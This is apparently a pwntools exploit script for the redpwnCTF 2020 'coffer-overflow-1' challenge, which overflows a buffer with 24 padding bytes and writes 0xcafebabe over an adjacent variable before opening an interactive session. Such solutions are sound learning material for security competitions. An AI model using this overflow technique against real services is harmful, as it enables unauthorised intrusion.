#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']


exe = remote('2020.redpwnc.tf', 31255)
#exe = process('./coffer-overflow-1')
exe.readuntil('What do you want to fill your coffer with?')

buf = '\x90' * 24 + p32(0xcafebabe)
exe.sendline(buf)
exe.interactive()
